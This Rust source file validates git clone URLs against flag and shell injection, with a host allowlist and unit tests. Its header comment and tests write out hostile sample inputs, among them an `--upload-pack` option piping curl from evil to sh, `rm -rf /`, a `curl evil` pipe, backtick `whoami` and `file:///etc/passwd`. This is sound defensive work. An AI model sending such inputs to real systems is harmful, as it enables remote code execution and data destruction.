// @file: git_url_validator.rs
// @description: git clone URL 白名单 + 参数注入防御（安全 finding #22）
//               clone_repository_cmd 把前端传入 URL 喂给 git CLI，攻击者通过 XSS
//               触发的 invoke 可传 `--upload-pack="curl evil|sh"` 实现 RCE。
//               本模块在 URL 进入 Command::new("git") 前做四层校验：
//               1. 拒 `-` 开头（防 git clone --upload-pack=...）
//               2. 拒命令注入字符（\n \r ; | & $ ` \ \0）
//               3. scheme 必须 https:// 或 git@host:path（拒 file:// ssh:// ftp://）
//               4. host 必须在白名单内（github.com / gitlab.com / bitbucket.org）
// @author: Atlas.oi
// @date: 2026-05-08

use url::Url;

/// git clone URL 校验失败的错误类型
///
/// thiserror 派生 Display + std::error::Error，让上层 map_err 拿到中文描述。
#[derive(Debug, thiserror::Error)]
pub enum GitUrlError {
    #[error("URL 必须是 https:// 或 git@host:path 格式")]
    InvalidScheme,
    #[error("URL 含可疑参数注入字符")]
    ArgumentInjection,
    #[error("host 不在白名单内")]
    HostNotAllowed,
    #[error("URL 解析失败: {0}")]
    ParseFailed(String),
}

/// 允许 clone 的 host 白名单
///
/// 业务背景：GhostTerm 仅作开发者工具克隆公开/私有仓库，三家主流平台已覆盖
/// 99% 场景。需要扩展时直接增条目，不写 runtime 配置避免供给攻击面。
const ALLOWED_HOSTS: &[&str] = &[
    "github.com",
    "gitlab.com",
    "bitbucket.org",
];

/// 校验 git clone URL 是否安全
///
/// 业务流程：
/// 1. 拒 `-` 开头（防 git CLI 把 URL 当 flag 解析，例如 --upload-pack=evil）
/// 2. 拒命令注入字符（\n \r ; | & $ ` \ \0），防 shell 元字符
/// 3. https:// scheme：用 url crate 解析后取 host_str 比对白名单
/// 4. git@host:path scheme：strip_prefix 后 split_once(':') 取 host 比对白名单
/// 5. 其他 scheme（file:// / ssh:// / ftp:// / http://）一律拒
pub fn validate_clone_url(url: &str) -> Result<(), GitUrlError> {
    // 第一步：拒 `-` 开头，防 git CLI 参数注入
    if url.starts_with('-') {
        return Err(GitUrlError::ArgumentInjection);
    }

    // 第二步：拒命令注入字符
    let bad_chars = ['\n', '\r', ';', '|', '&', '$', '`', '\\', '\0'];
    if url.chars().any(|c| bad_chars.contains(&c)) {
        return Err(GitUrlError::ArgumentInjection);
    }

    // 第三步：https:// scheme 用 url crate 解析
    if url.starts_with("https://") {
        let parsed = Url::parse(url).map_err(|e| GitUrlError::ParseFailed(e.to_string()))?;
        let host = parsed.host_str().ok_or(GitUrlError::InvalidScheme)?;
        if !ALLOWED_HOSTS.contains(&host) {
            return Err(GitUrlError::HostNotAllowed);
        }
        return Ok(());
    }

    // 第四步：git@host:path scheme 手工拆分
    if let Some(rest) = url.strip_prefix("git@") {
        if let Some((host, path)) = rest.split_once(':') {
            // path 不能为空，避免 git@github.com: 这种半截 URL 通过
            if path.is_empty() {
                return Err(GitUrlError::InvalidScheme);
            }
            if !ALLOWED_HOSTS.contains(&host) {
                return Err(GitUrlError::HostNotAllowed);
            }
            return Ok(());
        }
    }

    // 兜底：其他 scheme（file:// / ssh:// / ftp:// / http:// / 无 scheme）一律拒
    Err(GitUrlError::InvalidScheme)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rejects_argument_injection() {
        // 防 git clone --upload-pack=... 这类 flag 注入
        assert!(validate_clone_url("--upload-pack=evil").is_err());
        assert!(validate_clone_url("-c core.fsmonitor=evil").is_err());
        // 防 shell 命令注入字符
        assert!(validate_clone_url("https://github.com/x/y;rm -rf /").is_err());
        assert!(validate_clone_url("https://github.com/x/y|curl evil").is_err());
        assert!(validate_clone_url("https://github.com/x/y\nevil").is_err());
        assert!(validate_clone_url("https://github.com/x/y$IFS").is_err());
        assert!(validate_clone_url("https://github.com/x/y`whoami`").is_err());
        assert!(validate_clone_url("https://github.com/x/y&background").is_err());
        assert!(validate_clone_url("https://github.com/x/y\\evil").is_err());
    }

    #[test]
    fn rejects_disallowed_schemes() {
        // file:// 可读本地任意文件
        assert!(validate_clone_url("file:///etc/passwd").is_err());
        // ssh:// 可走未授权 server 触发 known_hosts 等副作用
        assert!(validate_clone_url("ssh://malicious-server/repo.git").is_err());
        // ftp:// 弱协议
        assert!(validate_clone_url("ftp://example.com/repo.git").is_err());
        // http:// 明文（即使 host 是 github 也拒，强制 https）
        assert!(validate_clone_url("http://github.com/x/y").is_err());
    }

    #[test]
    fn rejects_disallowed_hosts() {
        assert!(validate_clone_url("https://evil.com/repo.git").is_err());
        assert!(validate_clone_url("git@evil.com:path/repo.git").is_err());
        // 子域名不在白名单内（白名单是精确匹配）
        assert!(validate_clone_url("https://raw.github.com/x/y").is_err());
    }

    #[test]
    fn accepts_valid_https() {
        assert!(validate_clone_url("https://github.com/atlas-oi/ghostterm.git").is_ok());
        assert!(validate_clone_url("https://gitlab.com/group/project").is_ok());
        assert!(validate_clone_url("https://bitbucket.org/user/repo").is_ok());
    }

    #[test]
    fn accepts_valid_ssh() {
        assert!(validate_clone_url("git@github.com:atlas-oi/ghostterm.git").is_ok());
        assert!(validate_clone_url("git@gitlab.com:group/project.git").is_ok());
        assert!(validate_clone_url("git@bitbucket.org:user/repo.git").is_ok());
    }

    #[test]
    fn rejects_empty_or_invalid() {
        assert!(validate_clone_url("").is_err());
        assert!(validate_clone_url("not-a-url").is_err());
        assert!(validate_clone_url("git@").is_err());
        assert!(validate_clone_url("git@github.com").is_err());
        assert!(validate_clone_url("git@github.com:").is_err());
    }
}
